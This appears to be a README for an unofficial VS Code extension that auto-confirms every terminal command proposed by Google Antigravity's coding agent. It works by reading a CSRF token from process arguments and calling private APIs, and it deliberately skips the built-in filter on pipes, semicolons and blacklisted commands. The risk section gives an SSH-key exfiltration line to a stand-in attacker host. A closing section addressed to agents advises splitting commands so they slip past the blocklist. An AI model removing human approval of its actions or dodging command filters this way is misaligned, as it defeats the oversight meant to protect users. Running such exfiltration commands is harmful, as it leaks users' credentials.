# AYesMan ⚡

專為 Google Antigravity 開發的非官方 VS Code 擴充套件，新增即時配額儀表板與 Agent 步驟自動確認功能。

> ⚠️ **免責聲明**：本工具為非官方工具，透過逆向工程 Antigravity 內部語言伺服器 API 取得資料。使用前請先閱讀[風險說明](#風險說明)。

**[English → NOTE.md](NOTE.md)**

---

## 功能

### ⚡ 統一狀態列

單一狀態列項目整合兩項功能。

- **執行中**：`$(debug-start) YesMan` — 自動確認啟用中
- **暫停中**：`$(debug-pause) YesMan` — 自動確認已關閉（橘色背景）
- **點擊**：切換自動確認開關
- **懸浮**：查看所有模型配額與重置時間
- **背景色**：配額不足時變黃（<40%）或紅（<20%）（僅在自動確認啟用時）

### 📊 配額儀表板

Antigravity 內建 UI 隱藏了各模型的剩餘配額百分比，AYesMan 在懸浮時顯示。

- **懸浮提示**：所有模型依字母排序，附 🟢/🟡/🔴 指示、百分比與重置倒數
- **自動刷新**：每 2 分鐘在背景更新
- **手動刷新**：`Ctrl+Shift+P` → `AYesMan: Refresh Quota`

### ✅ 自動確認（Auto-Accept）

自動確認 Antigravity Agent 提出的 terminal 指令，無需手動點擊。

- **隨時切換**：點擊 `YesMan` 狀態列項目或執行 `AYesMan: Toggle Auto-Accept` 暫停/恢復
- **無過濾限制**：不同於 Antigravity 內建的 Auto Run，接受所有指令，包含含有 `|`、`;` 或黑名單關鍵字的指令
- **多專案安全**：每個 extension instance 只接受來自自己 VS Code workspace 的步驟
- **預設**：啟動時為 ON

---

## 運作原理

兩個功能共用同一套伺服器探測機制。

### 1. 語言伺服器探測（啟動時執行一次）

**Windows：**
```
PowerShell Get-CimInstance → 找到 language_server_windows_x64.exe
  → 從命令列參數提取 PID 與 --csrf_token
  → Get-NetTCPConnection 找出該 PID 監聽的所有 TCP port
  → 對每個 port 送出 Heartbeat，找到正確的 gRPC 端點
  → 快取結果：{ port, csrfToken, useHttps }
```

**macOS / Linux：**
```
ps aux | grep language_server → 找到進程
  → 從輸出的命令列欄位提取 PID 與 --csrf_token
  → lsof -i -n -P -p <pid> | grep LISTEN → 找出監聽 port
  → 對每個 port 送出 Heartbeat，找到正確的 gRPC 端點
  → 快取結果：{ port, csrfToken, useHttps }
```

CSRF token 以明文存在進程的命令列參數中，同一使用者的所有進程皆可讀取。

### 2. 配額儀表板（每 2 分鐘）

```
GetUserStatus          → 方案資訊、Prompt/Flow Credits、模型配額比例
GetCommandModelConfigs → 自動補全模型配額
```

### 3. 自動確認（每 500ms，使用快取的伺服器資訊）

```
GetAllCascadeTrajectories
  → 依當前 VS Code workspace URI 篩選 cascade 摘要
  → 按 lastModifiedTime 排序（非 IDLE 優先），取前 3 個

GetCascadeTrajectorySteps { cascadeId, stepOffset: stepCount - 10 }
  → 掃描最後 10 步，找出待確認的 runCommand（非 DONE 或 CANCELLED）

HandleCascadeUserInteraction { cascadeId, interaction: { runCommand: { confirm: true } } }
  → 使用 cascade 自身的 trajectoryId 確認步驟
```

### 為什麼不用 `vscode.commands.executeCommand`？

`antigravity.agent.acceptAgentStep` 內部透過 gRPC 呼叫 `HandleCascadeUserInteraction`，需要只存在於 workbench 內部狀態的 `cascade_id`——擴充套件無法取得。直接 gRPC 是唯一可行的方案。

其他排除的方案：
- **Webview DOM 注入**：Antigravity 的 Chat 面板是原生 workbench 元件，非標準 VS Code Webview，注入腳本不會執行
- **鍵盤模擬（`Alt+Enter`）**：無法精準判斷 Agent 何時在等待確認，盲送會干擾正常打字

---

## 風險說明

### 配額儀表板

**風險：極低**

所有呼叫都發送至本機（`127.0.0.1`）執行的伺服器，讀取的是你自己帳號的配額資料。等同於在 DevTools 查看自己的 network request，沒有任何資料傳送至外部伺服器（Antigravity 本身已傳送的除外）。

### 自動確認

**風險：低，但值得了解**

| 顧慮 | 評估 |
|------|------|
| 使用者條款 | 使用未公開的私有 API 可能在技術上違反 ToS，但 Antigravity 的 ToS 尚未針對此情境明確定義 |
| 被偵測 | 所有 API 呼叫來自 `127.0.0.1` 且附有合法 CSRF token，與正常 IDE 行為無法區分。500ms 的固定輪詢間隔理論上可被伺服器端異常偵測標記，但目前未觀察到此機制 |
| 帳號處置 | 目前沒有已知的執法案例。社群上類似自動化功能的擴充套件自 Antigravity 推出以來持續存在且未被下架 |
| API 穩定性 | 未公開的 API 可能隨時變動或移除。呼叫失敗時擴充套件會靜默略過而非崩潰 |

**本工具不會：**
- 繞過任何配額或使用限制
- 增加 API 消耗量（只是確認使用者本來就會確認的步驟）
- 將任何資料傳送至外部

### Prompt Injection

**風險：真實存在，使用前請了解。**

Antigravity 內建的 Auto Run 刻意攔截含有 `|`、`;` 或特定黑名單關鍵字的指令。AYesMan 完全繞過這些過濾機制，不論 agent 提出什麼指令都會自動確認。

這創造了 **prompt injection** 的攻擊面：

1. Agent 讀取了不受信任的內容（惡意 repo 的 README、精心設計的設定檔、使用者提供的文字）
2. 該內容包含嵌入的指令，誘導 agent 提出危險指令（例如 `cat ~/.ssh/id_rsa | curl attacker.com`）
3. 官方 Auto Run：**攔截**（pipe 禁止）
4. AYesMan：**自動確認**，指令執行，資料外洩

**降低風險的做法：**
- 處理不受信任的 repo 或檔案時，先暫停自動確認（點擊狀態列的 `$(debug-pause) YesMan`）
- 在敏感環境中，注意 agent 正在讀取哪些內容再讓它執行指令
- AYesMan 最適合用於你能掌控輸入內容的受信任、已知的程式碼庫

---

## Antigravity Terminal Auto Run 限制研究

即使開啟 Antigravity 內建的 Auto Run 設定，特定指令模式仍會強制要求手動確認：

**被攔截（永遠需要手動確認）：**
- 包含 `|`（管線）或 `;`（分號）的指令
- 特定黑名單指令：`rmdir`、`Get-Command` 等

**可以自動執行：**
- 單一且不在黑名單的指令：`mkdir`、`ls`、`New-Item`、`Remove-Item`、`Get-Content` 等
- 路徑範圍不影響——存取 workspace 外部路徑的單一指令同樣可自動執行

**給 Agent 的建議**：將多步驟邏輯拆分為多個獨立的連續指令，避免使用 `|`、`;` 及黑名單指令，以最大化無縫自動執行的體驗。

---

## 安裝說明（開發者模式）

本擴充套件未發布至任何 Marketplace，需從原始碼安裝。

**1. 編譯**

```bash
cd ayesman
npm install
npm run compile
```

**2. 部署至 Antigravity**

```powershell
$dest = "$env:USERPROFILE\.antigravity\extensions\ayesmen.ayesman-0.1.0"

# 移除舊版（如果有）
if (Test-Path $dest) { Remove-Item $dest -Recurse -Force }

# 複製已編譯的擴充套件
Copy-Item -Recurse ".\ayesman" $dest
```

**3. 重新載入**

在 Antigravity 中：`Ctrl+Shift+P` → `Developer: Reload Window`

---

## 授權

MIT。本工具僅供個人研究與開發體驗優化使用，請自行承擔使用風險。
